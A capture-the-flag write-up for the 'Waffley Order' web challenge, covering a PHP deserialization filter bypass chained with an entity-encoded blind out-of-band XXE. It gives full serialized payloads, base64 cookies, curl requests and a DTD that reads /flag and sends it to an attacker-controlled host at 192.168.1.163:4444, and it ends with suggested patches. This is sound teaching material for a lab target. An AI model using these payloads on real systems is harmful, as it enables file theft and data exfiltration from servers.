# htb - waffley order

## first inspection

Upon visiting the challenge site we are presented with an interface that allows us to order *WAFfles* or *Ice Scream* by specifying a *Table Number* and we get a response like the following when ordering:   
`Hello guest_63fb, your WAFfles order has been submitted successfully.`  

The page source shows that the form accepts two fields with ids of *food* and *table*.  
Nothing seems too suspicious at first glance, so let's have a look at the app's source code.

## source code

Here is the challenge file tree:
```
challenge/
├── assets
│   ├── css
│   │   └── main.css
│   ├── favicon.ico
│   └── js
│       └── main.js
├── controllers
│   └── OrderController.php
├── index.php
├── models
│   ├── UserModel.php
│   └── XmlParserModel.php
├── Router.php
└── views
    └── menu.php

7 directories, 9 files
```

### index.php
We can instantly get some useful info from index.php.  
  
First thing is that the app checks if the **PHPSESSID cookie** is empty. If it is empty, it creates a new cookie by **serializing** and then **base64 encoding** an instance of the *UserModel* class. This implies that `unserialize()` is also used later to retrieve the serialized data from the cookie, which hints to an **unsafe deserialization** vulnerability. The use of `unserialize()` is dangerous when applied on user-supplied data (in this case by cookie tampering), because it can lead to arbitrary code execution.
  
Another thing is that index.php creates a new route to the `/api/order` endpoint, which accepts **POST** requests, and maps it to the `OrderController` class and it's **order** method.

Let's a take look at `OrderController.php` to see what happens when we make an order.

### OrderController.php
This file contains the class **OrderController** with only an **order** method which is called when a POST request is made on `/api/order`.

#### order()
The **order** method is responsible for base64 decoding the PHPSESSID cookie and then passing the **serialized data** through the **safe_object()** function, to make sure that it's secure to **unserialize** the cookie. If the cookie passes the `safe_object()` check, the app proceeds to unserialize the cookie and print the appropriate response message to the user.

#### safe_object()
The **safe_object()** function, uses the following regex `'/(^|;)O:\d+:"([^"]+)"/'` to match all the serialized PHP objects. Specifically, this regex matches:  

* `(^|;)` The start of the string or a semicolon '**;**' character, followed by
* `O` which is the type identifier for a PHP serialized object string,
* `:\d+` then it matches the object's name length, by using '**\d**' to match a digit and the '**+**' which means *any amount*,  
* `:"([^"]+)"` and lastly the object's class name. The outer '**"**' (double quotes) are literal and the `[^"]+` will match any character that is not a '**"**' (double quote).
  
Notice that the parentheses '**( )**' are used to specify *capture groups*. They are not necessary for the regex to work.

All the matched objects are added in an array variable called `$matches`. For every match, the class name is retrieved, and for every class all it's methods are retrieved using the `get_class_methods` function. All the methods are at last checked against this regex `'/^__.*$/'`, which matches all the methods that start with '**__**' (dunder). If any method matches, the script terminates.

The reason for this check is because in PHP, functions starting with '**__**' are special methods, called **magic methods** and are automatically called by the language when **certain actions are performed on an object**. For example, when unserialize() is called on a serialized instance of a class, it will search for the presence of the magic method `__wakeup()` in the class body and **execute** it, which can introduce vulnerabilities.

## vulnerability
Let's start thinking about a possible attack scenario.  

As previously mentioned, it's possible to tamper with the cookie when making an order. This means that if we can somehow **bypass** the `safe_object()` check, we can control the data that gets **unserialized**. Ideally, we're looking for a class that contains the `__wakeup()` method. By checking all the available classes in the app's source code, we find the `XmlParserModel` class.

### XmlParserModel->__wakeup()
This `__wakeup()` method is used to check whether the serialized data contains *unsafe* or *malformed XML*. If the XML is deemed safe, the method uses the `simplexml_load_string()` function to load it into a *SimpleXML* object. If this operation fails (i.e. the XML is malformed), the script terminates.

This function also uses regex as a safety measure.  
`"/<!(?:DOCTYPE|ENTITY)(?:\s|%|&#[0-9]+;|&#x[0-9a-fA-F]+;)+[^\s]+\s+(?:SYSTEM|PUBLIC)\s+[\'\"]/im"`    

Without getting in too much detail, this regex attempts to block typical XML documents that start either with `<!ENTITY` or `<!DOCTYPE` and contain the strings `SYSTEM` or `PUBLIC` which can lead to security issues.

Here, the `simplexml_load_string()` uses the `LIBXML_NOENT` flag. This flag allows **external entity substitution** which makes this code vulnerable to an **XXE (XML External Entity)** attack, which can then lead to **RCE**.

So, if we are able to bypass the two regular expressions, we should be able to get RCE on the server.

## attack plan
A recap of the attack plan:  
* **serialize** and **base64 encode** an instance of the `XmlParserModel` class (this will be our cookie)  
* **bypass** the `safe_object` regex
* create an **XML document** that bypasses the **__wakeup()** regex
* **XXE**

## exploitation

### create a test cookie
First, let's serialize an instance of the XmlParserModel class:
```php
$data = "s0m3_d4t4";
$xml = new XmlParserModel($data);
$serialized_data = serialize($xml);  

echo $serialized_data;
# O:14:"XmlParserModel":1:{s:20:"XmlParserModeldata";s:9:"s0m3_d4t4";}
  
echo base64_encode($serialized_data);
# TzoxNDoiWG1sUGFyc2VyTW9kZWwiOjE6e3M6MjA6IgBYbWxQYXJzZXJNb2RlbABkYXRhIjtzOjk6InMwbTNfZDR0NCI7fQ==
```  
now pass the base64 encoded data as the PHPSESSID cookie on the POST request at `/api/order`:
```sh
curl -s -X POST 'http://challenges.testing.ctflib.eu:55054/api/order' \
-H 'Content-Type: application/json' \
--data-binary '{"table_num":"1","food":"WAFfles"}' \
-b 'PHPSESSID=TzoxNDoiWG1sUGFyc2VyTW9kZWwiOjE6e3M6MjA6IgBYbWxQYXJzZXJNb2RlbABkYXRhIjtzOjk6InMwbTNfZDR0NCI7fQ=='
```
and we get `Unsafe method: __construct` as a response. So the `safe_object()` caught the `__construct()` function of XmlParserModel and killed the process. We need to bypass the regex to continue.

### bypass regex #1
I spent a lot of time trying to bypass this regex and went down some rabbit holes, trying to use custom objects to avoid the `O:` identifier or use techniques that were apparently patched in PHP 7.4.

There are two important things to notice here.  
First, is that the `safe_object()` uses the `$matches` array and specifically `$matches[2][$i]` to get the name of each class. The `2` here represents the second *capture group* of the regex (the second set of parentheses), which is everything that gets matched by the `[^"]+` part.  
The second thing is that regex doesn't work recursively, meaning that it won't match every possible substring if they overlap. For example:  
```php  
$string = "ababa";
preg_match_all('/aba/', $string, $matches);
print_r($matches[0][0]);
# aba
```  

If we use the regular expression `/aba/`, we would expect it to match twice, but since the 2 substrings overlap, the regular expression would only match once, for the "aba" at the beginning of the string.

So, if we manage to trick the regex into matching a different `O:` identifier along with the original, it shouldn't be able to retrieve the class name correctly. To achieve this, we can add in the serialized data a string in the format of `;O:1:`. Let's create an array of a single element with a key-value pair and serialize that instead, like this:  
```php  
$data = "s0m3_d4t4";
$xml = new XmlParserModel($data);
$serialized_data = serialize([";O:1337:" => $xml]);

echo $serialized_data;
# a:1:{s:8:";O:1337:";O:14:"XmlParserModel":1:{s:20:"XmlParserModeldata";s:9:"s0m3_d4t4";}}

echo base64_encode($serialized_data);
# YToxOntzOjg6IjtPOjEzMzc6IjtPOjE0OiJYbWxQYXJzZXJNb2RlbCI6MTp7czoyMDoiAFhtbFBhcnNlck1vZGVsAGRhdGEiO3M6OToiczBtM19kNHQ0Ijt9fQ==
```  

Here the regex will match:  
a:1:{s:8:"**;O:1337:";O:14:**"XmlParserModel":1:{s:20:"XmlParserModeldata";s:9:"s0m3_d4t4";}}  

Good. Since both `O:` identifiers are matched together, the `safe_object` won't check for the methods of the original `;O:14:` separately. Instead, the function will parse `;O:14` as the class name, as this is what's enclosed in **""** according to the regex. This will cause an error when `get_class_method()` gets called, but it won't crash the program. Let's try to use this as the cookie:
```sh  
curl -s -X POST 'http://challenges.testing.ctflib.eu:55054/api/order' \
-H 'Content-Type: application/json' \
--data-binary '{"table_num":"1","food":"WAFfles"}' \
-b 'PHPSESSID=YToxOntzOjg6IjtPOjEzMzc6IjtPOjE0OiJYbWxQYXJzZXJNb2RlbCI6MTp7czoyMDoiAFhtbFBhcnNlck1vZGVsAGRhdGEiO3M6OToiczBtM19kNHQ0Ijt9fQ=='
```  
and now we get `Malformed XML` as the response. This means that we successfully bypassed the regex check, and the cookie was effectively unserialized, thus calling the `__wakeup()` method of the XmlParserModel class. If we try to use a basic XXE payload that prints the flag as the data, for example:  
`<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///flag"> ]><data>&xxe;</data>`
we get `Unsafe XML`.

### bypass regex #2
This regex is much simpler to bypass. Since the regex will match only if the XML contains both `ENTITY|DOCTYPE` and `SYSTEM|PUBLIC` entities, we can encode part of the XML using HTML entities. By encoding the `SYSTEM "file:///flag"` part, the payload becomes:  
`<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe "&#x53;&#x59;&#x53;&#x54;&#x45;&#x4d;&#x20;&#x22;&#x66;&#x69;&#x6c;&#x65;&#x3a;&#x2f;&#x2f;&#x2f;&#x66;&#x6c;&#x61;&#x67;&#x22;"> ]><data>&xxe;</data>`  

From this we get a normal success response which implies that we successfully bypassed the regex, but not any other output, any errors or the flag.

### Blind Out-of-Band (OOB) XXE
The XXE attack doesn't return any feedback, so this seems to be a **blind** attack.  

In this case we can **exfiltrate** the response data using an **out-of-band XXE**. This attack assumes sending a malicious XML to the application that will force it to make an *outbound connection* to a server we control, thus the name.

First, let's modify the previous XML to reference a dtd file on our server instead:  
`<!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://192.168.1.163:4444/bypass.dtd" >%a;%dtd;]><data><env>&exfil;</env></data>`  

And use HTML entities to bypass the regex:  
`<!DOCTYPE foo [<!ENTITY % a "&#x3c;&#x21;&#x45;&#x4e;&#x54;&#x49;&#x54;&#x59;&#x20;&#x25;&#x20;&#x64;&#x74;&#x64;&#x20;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4d;&#x20;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3a;&#x2f;&#x2f;&#x31;&#x39;&#x32;&#x2e;&#x31;&#x36;&#x38;&#x2e;&#x31;&#x2e;&#x31;&#x36;&#x33;&#x3a;&#x34;&#x34;&#x34;&#x34;&#x2f;&#x62;&#x79;&#x70;&#x61;&#x73;&#x73;&#x2e;&#x64;&#x74;&#x64;&#x22;&#x20;&#x3e;" >%a;%dtd;]><data><env>&exfil;</env></data>`

The `exfil` entity is defined in our bypass.dtd:  
```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % abt "<!ENTITY exfil SYSTEM 'http://192.168.1.163:4444/bypass.xml?%data;'>">
%abt;
```  
This dtd defines the `data`, `abt` and `exfil` entities, which in short will read the flag from the server, base64 encode it and then make an outbound connection to our server at http://192.168.1.163:4444/bypass.xml?%data, which includes the base64-encoded contents of the /flag file as a query parameter. Let's see this in action:

```php  
$data = "<!DOCTYPE foo [<!ENTITY % a \"&#x3c;&#x21;&#x45;&#x4e;&#x54;&#x49;&#x54;&#x59;&#x20;&#x25;&#x20;&#x64;&#x74;&#x64;&#x20;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4d;&#x20;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3a;&#x2f;&#x2f;&#x31;&#x39;&#x32;&#x2e;&#x31;&#x36;&#x38;&#x2e;&#x31;&#x2e;&#x31;&#x36;&#x33;&#x3a;&#x34;&#x34;&#x34;&#x34;&#x2f;&#x62;&#x79;&#x70;&#x61;&#x73;&#x73;&#x2e;&#x64;&#x74;&#x64;&#x22;&#x20;&#x3e;\" >%a;%dtd;]><data><env>&exfil;</env></data>";

$xml = new XmlParserModel($data);
$serialized_data = serialize([";O:1337:" => $xml]);

echo $serialized_data;
# <!DOCTYPE foo [<!ENTITY % a "&#x3c;&#x21;&#x45;&#x4e;&#x54;&#x49;&#x54;&#x59;&#x20;&#x25;&#x20;&#x64;&#x74;&#x64;&#x20;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4d;&#x20;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3a;&#x2f;&#x2f;&#x31;&#x39;&#x32;&#x2e;&#x31;&#x36;&#x38;&#x2e;&#x31;&#x2e;&#x31;&#x36;&#x33;&#x3a;&#x34;&#x34;&#x34;&#x34;&#x2f;&#x62;&#x79;&#x70;&#x61;&#x73;&#x73;&#x2e;&#x64;&#x74;&#x64;&#x22;&#x20;&#x3e;" >%a;%dtd;]><data><env>&exfil;</env></data>a:1:{s:8:";O:1337:";O:14:"XmlParserModel":1:{s:20:"XmlParserModeldata";s:445:"<!DOCTYPE foo [<!ENTITY % a "&#x3c;&#x21;&#x45;&#x4e;&#x54;&#x49;&#x54;&#x59;&#x20;&#x25;&#x20;&#x64;&#x74;&#x64;&#x20;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4d;&#x20;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3a;&#x2f;&#x2f;&#x31;&#x39;&#x32;&#x2e;&#x31;&#x36;&#x38;&#x2e;&#x31;&#x2e;&#x31;&#x36;&#x33;&#x3a;&#x34;&#x34;&#x34;&#x34;&#x2f;&#x62;&#x79;&#x70;&#x61;&#x73;&#x73;&#x2e;&#x64;&#x74;&#x64;&#x22;&#x20;&#x3e;" >%a;%dtd;]><data><env>&exfil;</env></data>";}}

echo base64_encode($serialized_data);
# YToxOntzOjg6IjtPOjEzMzc6IjtPOjE0OiJYbWxQYXJzZXJNb2RlbCI6MTp7czoyMDoiAFhtbFBhcnNlck1vZGVsAGRhdGEiO3M6NDQ1OiI8IURPQ1RZUEUgZm9vIFs8IUVOVElUWSAlIGEgIiYjeDNjOyYjeDIxOyYjeDQ1OyYjeDRlOyYjeDU0OyYjeDQ5OyYjeDU0OyYjeDU5OyYjeDIwOyYjeDI1OyYjeDIwOyYjeDY0OyYjeDc0OyYjeDY0OyYjeDIwOyYjeDUzOyYjeDU5OyYjeDUzOyYjeDU0OyYjeDQ1OyYjeDRkOyYjeDIwOyYjeDIyOyYjeDY4OyYjeDc0OyYjeDc0OyYjeDcwOyYjeDNhOyYjeDJmOyYjeDJmOyYjeDMxOyYjeDM5OyYjeDMyOyYjeDJlOyYjeDMxOyYjeDM2OyYjeDM4OyYjeDJlOyYjeDMxOyYjeDJlOyYjeDMxOyYjeDM2OyYjeDMzOyYjeDNhOyYjeDM0OyYjeDM0OyYjeDM0OyYjeDM0OyYjeDJmOyYjeDYyOyYjeDc5OyYjeDcwOyYjeDYxOyYjeDczOyYjeDczOyYjeDJlOyYjeDY0OyYjeDc0OyYjeDY0OyYjeDIyOyYjeDIwOyYjeDNlOyIgPiVhOyVkdGQ7XT48ZGF0YT48ZW52PiZleGZpbDs8L2Vudj48L2RhdGE+Ijt9fQ==

```

Make the request:
```sh  
curl -s -X POST 'http://172.17.0.1:1337/api/order' \
-H 'Content-Type: application/json' \
--data-binary '{"table_num":"1","food":"WAFfles"}' \
-b 'PHPSESSID=YToxOntzOjg6IjtPOjEzMzc6IjtPOjE0OiJYbWxQYXJzZXJNb2RlbCI6MTp7czoyMDoiAFhtbFBhcnNlck1vZGVsAGRhdGEiO3M6NDQ1OiI8IURPQ1RZUEUgZm9vIFs8IUVOVElUWSAlIGEgIiYjeDNjOyYjeDIxOyYjeDQ1OyYjeDRlOyYjeDU0OyYjeDQ5OyYjeDU0OyYjeDU5OyYjeDIwOyYjeDI1OyYjeDIwOyYjeDY0OyYjeDc0OyYjeDY0OyYjeDIwOyYjeDUzOyYjeDU5OyYjeDUzOyYjeDU0OyYjeDQ1OyYjeDRkOyYjeDIwOyYjeDIyOyYjeDY4OyYjeDc0OyYjeDc0OyYjeDcwOyYjeDNhOyYjeDJmOyYjeDJmOyYjeDMxOyYjeDM5OyYjeDMyOyYjeDJlOyYjeDMxOyYjeDM2OyYjeDM4OyYjeDJlOyYjeDMxOyYjeDJlOyYjeDMxOyYjeDM2OyYjeDMzOyYjeDNhOyYjeDM0OyYjeDM0OyYjeDM0OyYjeDM0OyYjeDJmOyYjeDYyOyYjeDc5OyYjeDcwOyYjeDYxOyYjeDczOyYjeDczOyYjeDJlOyYjeDY0OyYjeDc0OyYjeDY0OyYjeDIyOyYjeDIwOyYjeDNlOyIgPiVhOyVkdGQ7XT48ZGF0YT48ZW52PiZleGZpbDs8L2Vudj48L2RhdGE+Ijt9fQ=='
```  

And on our server we get a response that contains the base64 encoded flag:  
```  
172.17.0.2 - - [28/Feb/2023 09:16:46] "GET /bypass.dtd HTTP/1.0" 200 -
172.17.0.2 - - [28/Feb/2023 09:16:46] "GET /bypass.xml?SFRCe2Y0azNfZmw0Z19mMHJfdDNzdDFuZyF9 HTTP/1.0" 200 -  
```  


## patching

### LIBXML_NONET
One quick way to patch the vulnerability is by adding the `LIBXML_NONET` flag in the `simplexml_load_string()` function. This flag **disables network access** while parsing documents, which effectively prevents the out-of-band XXE attack, since the attacker server won't be reachable.
```php  
$env = @simplexml_load_string($this->data, 'SimpleXMLElement', LIBXML_NOENT | LIBXML_NONET);

```  

### Disallow XmlParserModel objects
Ideally we would like to only allow serialization of *UserModel* instances, but since the format of the serialized objects can be complex we can just check for serialized *XmlParserModel* objects instead.

```php  
function safe_object($serialized_data)
{
    if (preg_match_all('/XmlParserModel/', $serialized_data)) {
        die("Unsafe object");
    }

    $matches = [];
    $num_matches = preg_match_all('/(^|;)O:\d+:"([^"]+)"/', $serialized_data, $matches);

    for ($i = 0; $i < $num_matches; $i++) {
        $methods = get_class_methods($matches[2][$i]);
        foreach ($methods as $method) {
            if (preg_match('/^__.*$/', $method) != 0) {
                die("Unsafe method: ${method}");
            }
        }
    }
}
```  

### Other
Some other possible patching ideas:  
* enable **recursive regex** in the `safe_object()`
* use **session variables** instead of cookies to prevent tampering
* use **json_encode/json_decode** methods instead of **serialize/unserialize**

These are not so quick to implement and may require some refactoring of the source code.